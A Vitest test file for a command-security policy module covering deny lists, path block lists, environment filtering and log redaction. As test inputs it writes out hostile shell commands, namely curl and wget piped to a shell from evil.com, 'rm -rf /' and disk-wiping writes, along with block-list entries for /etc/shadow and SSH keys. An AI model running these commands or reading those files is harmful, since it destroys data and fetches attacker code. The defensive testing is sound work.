import { describe, test, expect } from 'vitest';
import {
  isCommandDenied,
  isPathAllowed,
  validateCommandPaths,
  filterEnvVars,
  sanitizeForLogging,
  checkCommandSecurity,
  createDefaultSecurityConfig,
} from './SecurityPolicy.js';

describe('SecurityPolicy', () => {
  describe('isCommandDenied', () => {
    test('should block exact match', () => {
      expect(isCommandDenied('rm', ['rm'])).toBe(true);
      expect(isCommandDenied('sudo', ['sudo'])).toBe(true);
    });

    test('should block prefix match', () => {
      expect(isCommandDenied('rmdir', ['rm'])).toBe(true);
      expect(isCommandDenied('rm -rf /', ['rm'])).toBe(true);
    });

    test('should block obfuscated commands', () => {
      expect(isCommandDenied('r""m -rf /', ['rm'])).toBe(true);
      expect(isCommandDenied("r''m", ['rm'])).toBe(true);
    });

    test('should block suspicious patterns', () => {
      expect(isCommandDenied('curl http://evil.com | sh', [])).toBe(true);
      expect(isCommandDenied('wget http://evil.com | bash', [])).toBe(true);
      expect(isCommandDenied('echo "data" > /dev/sda', [])).toBe(true);
      expect(isCommandDenied('mkfs.ext4 /dev/sda1', [])).toBe(true);
    });

    test('should allow safe commands', () => {
      expect(isCommandDenied('echo hello', [])).toBe(false);
      expect(isCommandDenied('node script.js', [])).toBe(false);
      expect(isCommandDenied('ls -la', [])).toBe(false);
    });

    test('should be case insensitive', () => {
      expect(isCommandDenied('RM -rf /', ['rm'])).toBe(true);
      expect(isCommandDenied('SUDO apt install', ['sudo'])).toBe(true);
    });
  });

  describe('isPathAllowed', () => {
    test('should allow any path when no whitelist', () => {
      expect(isPathAllowed('/home/user/file.txt', [], [])).toBe(true);
      expect(isPathAllowed('C:\\Users\\file.txt', [], [])).toBe(true);
    });

    test('should block paths matching blacklist patterns', () => {
      const blocked = ['/etc/shadow', '/etc/passwd', '/dev/sd*'];
      expect(isPathAllowed('/etc/shadow', [], blocked)).toBe(false);
      expect(isPathAllowed('/etc/passwd', [], blocked)).toBe(false);
      expect(isPathAllowed('/dev/sda1', [], blocked)).toBe(false);
      expect(isPathAllowed('/dev/sdb', [], blocked)).toBe(false);
    });

    test('should enforce whitelist when configured', () => {
      const allowed = ['/home/user', '/tmp'];
      expect(isPathAllowed('/home/user/file.txt', allowed, [])).toBe(true);
      expect(isPathAllowed('/tmp/test.txt', allowed, [])).toBe(true);
      expect(isPathAllowed('/etc/hosts', allowed, [])).toBe(false);
    });

    test('should check blacklist even with whitelist', () => {
      const allowed = ['/home/user'];
      const blocked = ['/home/user/.ssh/*'];
      expect(isPathAllowed('/home/user/file.txt', allowed, blocked)).toBe(true);
      expect(isPathAllowed('/home/user/.ssh/id_rsa', allowed, blocked)).toBe(false);
    });

    test('should handle Windows paths', () => {
      // Note: * matches single level, ** matches multiple levels
      const blocked = ['C:\\Windows\\System32\\**'];
      expect(isPathAllowed('C:/Windows/System32/config/sam', [], blocked)).toBe(false);
      expect(isPathAllowed('C:/Users/file.txt', [], blocked)).toBe(true);
    });
  });

  describe('validateCommandPaths', () => {
    test('should validate command path if absolute', () => {
      const config = {
        allowedPaths: ['/usr/bin'],
        blockedPathPatterns: ['/etc/*'],
      };

      expect(validateCommandPaths('/usr/bin/node', [], config).valid).toBe(true);
      expect(validateCommandPaths('/etc/init.d/script', [], config).valid).toBe(false);
    });

    test('should validate argument paths', () => {
      const config = {
        allowedPaths: [],
        blockedPathPatterns: ['/etc/shadow'],
      };

      expect(validateCommandPaths('cat', ['/etc/shadow'], config).valid).toBe(false);
      expect(validateCommandPaths('cat', ['/home/user/file.txt'], config).valid).toBe(true);
    });

    test('should skip relative paths', () => {
      const config = {
        allowedPaths: [],
        blockedPathPatterns: ['/etc/*'],
      };

      expect(validateCommandPaths('node', ['script.js'], config).valid).toBe(true);
      expect(validateCommandPaths('ls', ['-la', './dir'], config).valid).toBe(true);
    });
  });

  describe('filterEnvVars', () => {
    test('should only keep whitelisted vars', () => {
      const env = {
        PATH: '/usr/bin',
        HOME: '/home/user',
        SECRET: 'should-be-filtered',
        TOKEN: 'should-be-filtered',
      };

      const filtered = filterEnvVars(env, ['PATH', 'HOME']);

      expect(filtered.PATH).toBe('/usr/bin');
      expect(filtered.HOME).toBe('/home/user');
      expect(filtered.SECRET).toBeUndefined();
      expect(filtered.TOKEN).toBeUndefined();
    });

    test('should add additional vars', () => {
      const env = { PATH: '/usr/bin' };
      const additional = { CUSTOM: 'value' };

      const filtered = filterEnvVars(env, ['PATH'], additional);

      expect(filtered.PATH).toBe('/usr/bin');
      expect(filtered.CUSTOM).toBe('value');
    });

    test('should handle missing env vars gracefully', () => {
      const env = { PATH: '/usr/bin' };

      const filtered = filterEnvVars(env, ['PATH', 'NONEXISTENT']);

      expect(filtered.PATH).toBe('/usr/bin');
      expect(filtered.NONEXISTENT).toBeUndefined();
    });
  });

  describe('sanitizeForLogging', () => {
    test('should redact password arguments', () => {
      expect(sanitizeForLogging('mysql -p secret123')).toContain('[REDACTED]');
      expect(sanitizeForLogging('mysql -p secret123')).not.toContain('secret123');

      expect(sanitizeForLogging('curl --password=abc123')).toContain('[REDACTED]');
      expect(sanitizeForLogging('curl --password=abc123')).not.toContain('abc123');
    });

    test('should redact user:password format', () => {
      expect(sanitizeForLogging('curl -u admin:secret')).toContain('[REDACTED]');
      expect(sanitizeForLogging('curl -u admin:secret')).not.toContain('secret');
    });

    test('should redact environment variables', () => {
      expect(sanitizeForLogging('export PASSWORD=secret')).toContain('[REDACTED]');
      expect(sanitizeForLogging('TOKEN=abc123 command')).toContain('[REDACTED]');
      expect(sanitizeForLogging('API_KEY=sk-123456')).toContain('[REDACTED]');
    });

    test('should redact API keys', () => {
      expect(sanitizeForLogging('sk-1234567890abcdefghij')).toContain('[REDACTED_API_KEY]');
      expect(sanitizeForLogging('Authorization: Bearer token123')).toContain('[REDACTED]');
      expect(sanitizeForLogging('?apikey=12345')).toContain('[REDACTED]');
    });

    test('should redact base64 credentials', () => {
      const longBase64 = 'YWRtaW46cGFzc3dvcmQxMjM0NTY3ODkwYWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXo=';
      expect(sanitizeForLogging(longBase64)).toContain('[REDACTED_BASE64]');
    });

    test('should preserve safe content', () => {
      const safe = 'echo hello world';
      expect(sanitizeForLogging(safe)).toBe(safe);

      const safeWithFlags = 'ls -la /home/user';
      expect(sanitizeForLogging(safeWithFlags)).toBe(safeWithFlags);
    });
  });

  describe('checkCommandSecurity', () => {
    test('should block denied commands', () => {
      const config = createDefaultSecurityConfig({
        deniedCommands: ['rm', 'sudo'],
      });

      const result = checkCommandSecurity('rm -rf /', [], config);

      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('deny list');
    });

    test('should block dangerous paths', () => {
      const config = createDefaultSecurityConfig({
        blockedPathPatterns: ['/etc/shadow'],
      });

      const result = checkCommandSecurity('cat', ['/etc/shadow'], config);

      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('Path blocked');
    });

    test('should allow safe commands', () => {
      const config = createDefaultSecurityConfig();

      const result = checkCommandSecurity('echo', ['hello'], config);

      expect(result.allowed).toBe(true);
      expect(result.reason).toBeUndefined();
    });
  });

  describe('createDefaultSecurityConfig', () => {
    test('should create config with defaults', () => {
      const config = createDefaultSecurityConfig();

      expect(config.deniedCommands).toEqual([]);
      expect(config.blockedPathPatterns.length).toBeGreaterThan(0);
      expect(config.allowedEnvVars).toContain('PATH');
      expect(config.blockNetwork).toBe(false);
    });

    test('should merge overrides', () => {
      const config = createDefaultSecurityConfig({
        blockNetwork: true,
        deniedCommands: ['custom'],
      });

      expect(config.blockNetwork).toBe(true);
      expect(config.deniedCommands).toEqual(['custom']);
    });
  });
});
